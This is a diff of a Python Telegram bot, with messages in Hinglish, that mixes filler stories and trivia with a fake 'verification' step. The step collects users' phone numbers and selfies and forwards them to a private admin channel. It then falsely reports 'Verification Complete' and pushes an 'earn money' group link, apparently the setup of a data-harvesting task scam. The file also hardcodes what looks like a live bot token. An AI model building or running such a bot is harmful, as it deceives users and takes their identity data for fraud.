@@ -6,127 +6,71 @@ TOKEN = "8662928183:AAGId-ZkRay6-UD8mhkEINojC4joLMshs7U"
 
 bot = telebot.TeleBot(TOKEN)
 
-# verification channel
 ADMIN_CHANNEL = "@backup897"
-
-# team chat link
-TEAM_LINK = "https://t.me/botchat876"
+GROUP_LINK = "https://t.me/botchat876"
 
 user_data = {}
 
-# ---------------- START ----------------
-
+# START COMMAND
 @bot.message_handler(commands=['start'])
 def start(message):
-
     name = message.from_user.first_name
 
-    text = f"""
-Hello {name} 👋
-
-Welcome to our bot.
-
-Choose an option below:
-"""
+    text = f"Hello {name} 👋\n\nWelcome to our bot.\n\nChoose an option."
 
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
 
     btn1 = "📖 Stories"
     btn2 = "🧠 General Knowledge"
     btn3 = "🖼 Verification"
-    btn4 = "💬 Team se baat karein"
 
     markup.add(btn1, btn2)
-    markup.add(btn3, btn4)
+    markup.add(btn3)
 
     bot.send_message(message.chat.id, text, reply_markup=markup)
 
-# ---------------- TEAM CHAT ----------------
-
-@bot.message_handler(func=lambda m: m.text == "💬 Team se baat karein")
-def team(message):
-
-    bot.send_message(
-        message.chat.id,
-        f"Team se baat karne ke liye yahan join karein:\n{TEAM_LINK}"
-    )
-
-# ---------------- GENERAL KNOWLEDGE ----------------
-
-gk_list = [
-
-"India ka national animal Tiger hai.",
-"Sun ek star hai.",
-"Water ka formula H2O hai.",
-"Earth sun ke around ghoomti hai.",
-"Light ki speed approx 3 lakh km/s hai.",
-
-"Mount Everest duniya ka sabse uncha pahad hai.",
-"Human body me 206 bones hoti hain.",
-"Computer ka brain CPU hota hai.",
-"Shark machhliyon me sabse dangerous mani jati hai.",
-"Jupiter solar system ka sabse bada planet hai."
-
-]
-
-@bot.message_handler(func=lambda m: m.text == "🧠 General Knowledge")
-def gk(message):
-
-    fact = random.choice(gk_list)
-
-    bot.send_message(message.chat.id, f"🧠 GK Fact:\n\n{fact}")
-
-# ---------------- STORIES ----------------
-
+# STORIES
 stories = [
-
-"Ek ladka jungle me gaya aur use ek purana khazana mil gaya. Us khazane me sone ke sikke aur purane raaz chhupe the.",
-
-"Ek bandar ne ek aadmi ka mobile chura liya aur ped par chadh gaya. Sab log hansne lage jab bandar selfie lene laga.",
-
-"Ek train journey me do anjaan log mile aur dheere dheere unki dosti pyaar me badal gayi.",
-
-"Ek gaon me raat ko ajeeb awaaz aati thi. Jab logon ne pata lagaya to ek purana khazana mila.",
-
-"Ek chor ghar me ghusa lekin us ghar ka kutta uska dost ban gaya."
-
+"Ek jungle me ek ladka khazana dhundne gaya aur use ek purani diary mili.",
+"Ek bandar ne ek aadmi ka mobile chura liya aur selfie lene laga.",
+"Ek train journey me do log mile aur unki dosti ho gayi.",
+"Ek gaon me raat ko ajeeb awaaz aati thi aur log darte the."
 ]
 
 @bot.message_handler(func=lambda m: m.text == "📖 Stories")
 def story(message):
-
     s = random.choice(stories)
-
     bot.send_message(message.chat.id, f"📖 Story:\n\n{s}")
 
-# ---------------- VERIFICATION START ----------------
+# GENERAL KNOWLEDGE
+gk_list = [
+"India ka national animal Tiger hai.",
+"Sun ek star hai.",
+"Human body me 206 bones hoti hain.",
+"Earth sun ke around ghoomti hai.",
+"Jupiter solar system ka sabse bada planet hai."
+]
 
+@bot.message_handler(func=lambda m: m.text == "🧠 General Knowledge")
+def gk(message):
+    fact = random.choice(gk_list)
+    bot.send_message(message.chat.id, f"🧠 GK Fact:\n\n{fact}")
+
+# VERIFICATION START
 @bot.message_handler(func=lambda m: m.text == "🖼 Verification")
-def verify_start(message):
+def verification(message):
 
     bot.send_message(
         message.chat.id,
-        "Verification ke liye pehle apna phone number share karein.",
-        reply_markup=contact_button()
+        "Verification ke liye apna phone number type karke bheje."
     )
 
-def contact_button():
+    bot.register_next_step_handler(message, get_number)
 
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+# GET NUMBER
+def get_number(message):
 
-    btn = types.KeyboardButton("📱 Phone number share karein", request_contact=True)
-
-    markup.add(btn)
-
-    return markup
-
-# ---------------- RECEIVE PHONE ----------------
-
-@bot.message_handler(content_types=['contact'])
-def get_contact(message):
-
-    phone = message.contact.phone_number
-
+    phone = message.text
     user_data[message.chat.id] = phone
 
     bot.send_message(
@@ -134,13 +78,11 @@ def get_contact(message):
         "Ab verification ke liye ek selfie photo bheje."
     )
 
-# ---------------- RECEIVE PHOTO ----------------
-
+# RECEIVE PHOTO
 @bot.message_handler(content_types=['photo'])
 def get_photo(message):
 
     file_id = message.photo[-1].file_id
-
     phone = user_data.get(message.chat.id, "unknown")
 
     caption = f"""
@@ -158,11 +100,24 @@ User ID: {message.from_user.id}
         caption=caption
     )
 
+    remove = types.ReplyKeyboardRemove()
+
     bot.send_message(
         message.chat.id,
-        "✅ Verification request bhej diya gaya hai. Team jaldi check karegi."
+        "✅ Verification Complete!",
+        reply_markup=remove
     )
 
-# ---------------- RUN BOT ----------------
+    bot.send_message(
+        message.chat.id,
+        "💰 *My Question Solve and Earn Money*\n\nApna question solve karne ke liye group join kare.",
+        parse_mode="Markdown"
+    )
 
+    bot.send_message(
+        message.chat.id,
+        GROUP_LINK
+    )
+
+# RUN BOT
 bot.infinity_polling()
